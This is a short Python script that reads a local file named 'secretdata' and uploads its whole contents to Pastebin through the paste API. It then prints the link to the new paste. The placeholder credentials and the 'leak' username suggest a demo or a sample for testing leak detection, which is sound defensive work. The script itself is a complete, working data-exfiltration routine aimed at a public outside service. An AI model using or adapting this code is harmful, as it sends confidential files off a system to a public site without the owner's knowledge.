import requests

API_KEY = 'aXRzIGp1c3QgcmFuZG9tIGFwaSBrZXk='
USERNAME = 'johnleakleakleakleak'

FILE_PATH = 'secretdata'

with open(FILE_PATH, 'r') as file:
    file_content = file.read()

data = {
    'api_dev_key': API_KEY,
    'api_user_name': USERNAME,
    'api_option': 'paste',
    'api_paste_code': file_content
}

response = requests.post('https://pastebin.com/api/api_post.php', data=data)

if response.status_code == 200:
    print('Success')
    print(response.text)
else:
    print('Error. Response:', response.status_code)
